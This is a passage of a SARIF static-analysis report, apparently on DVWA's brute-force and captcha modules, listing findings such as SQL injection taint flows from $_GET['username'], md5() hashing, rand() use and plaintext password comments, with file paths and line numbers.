                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:19 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4752",
      "message" : {
        "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "F84E39BA8D8CA62EF9A64A929242DE44"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/high.php"
          },
          "region" : {
            "startLine" : 33,
            "endLine" : 33,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:33 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:33 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4581",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8B81E8D8FAB7C7740633A97B5F93BD26"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/impossible.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4547",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7195D2603CA13B54B726A89D71AF03FA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/impossible.php"
          },
          "region" : {
            "startLine" : 16,
            "endLine" : 16,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:16 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:16 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4463",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "41D40D34C18F8CF8334C3012E747E977"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/impossible.php"
          },
          "region" : {
            "startLine" : 52,
            "endLine" : 52,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:52 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 52
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:52 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 52
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4516",
      "message" : {
        "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "60C54AA24E15202A0207A76F20F60F2D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/impossible.php"
          },
          "region" : {
            "startLine" : 82,
            "endLine" : 82,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:82 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:82 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 82
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4383",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "0E601B419B49069586C803F34824B8D4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/low.php"
          },
          "region" : {
            "startLine" : 7,
            "endLine" : 7,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:7 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:7 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4775",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FFE94278133F9C7746920CB856B2720D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/low.php"
          },
          "region" : {
            "startLine" : 9,
            "endLine" : 9,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:9 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4689",
      "message" : {
        "text" : "Line 13 of low.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "D84F66123DC1C2CE90F684DD5AD52862"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/low.php"
          },
          "region" : {
            "startLine" : 13,
            "endLine" : 13,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:12 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4582",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8B81E8D8FAB7C7740633A97B5F93BD27"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/medium.php"
          },
          "region" : {
            "startLine" : 8,
            "endLine" : 8,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4756",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FB444222BD34936ECCB7661C797892FD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/medium.php"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4497",
      "message" : {
        "text" : "Line 15 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5B0361D2602C8792BE2E56029308762A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/brute/source/medium.php"
          },
          "region" : {
            "startLine" : 15,
            "endLine" : 15,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4435",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "2F633F9D7B86C2F654A7C1D8E65C7E2F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/high.php"
          },
          "region" : {
            "startLine" : 24,
            "endLine" : 24,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:24 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4554",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "77CDFDBE186E445EC7453DA04F1A99F4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/high.php"
          },
          "region" : {
            "startLine" : 27,
            "endLine" : 27,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:27 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:27 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 27
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4395",
      "message" : {
        "text" : "On line 31 of high.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "163D2797BD42D212411D79A4FCA55A81"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/high.php"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:31 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:31 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4384",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "0F3664CD4F4CDF1B089C80D4FA3BACAA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/high.php"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:37 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:37 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/high.php"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4584",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8C4672FE990162B3A9E9A3B98C6FA6AA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/impossible.php"
          },
          "region" : {
            "startLine" : 14,
            "endLine" : 14,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:14 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:14 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4707",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E1EC7C119DF7FFFEB425236F98F43FA3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/impossible.php"
          },
          "region" : {
            "startLine" : 19,
            "endLine" : 19,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:19 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:19 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4751",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F70162205216AACD5AA59552038E4473"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/impossible.php"
          },
          "region" : {
            "startLine" : 24,
            "endLine" : 24,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:24 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:24 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4573",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "88C44EA3A2B1A0FB3B9C38427D925B53"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/impossible.php"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:39 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:39 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4546",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "703B48012AEAD458D9A1C3115356DB65"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/impossible.php"
          },
          "region" : {
            "startLine" : 45,
            "endLine" : 45,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:45 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:45 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/impossible.php"
                },
                "region" : {
                  "startLine" : 45
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4436",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "2F633F9D7B86C2F654A7C1D8E65C7E30"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/low.php"
          },
          "region" : {
            "startLine" : 25,
            "endLine" : 25,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:25 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:25 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4541",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6FAA2FFA81BDA015B6E2C38368029111"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/low.php"
          },
          "region" : {
            "startLine" : 38,
            "endLine" : 38,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:38 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:38 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4442",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "32B89CC5F17F9C90713FCD07FE3AA361"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/captcha/source/low.php"
          },
          "region" : {
            "startLine" : 53,
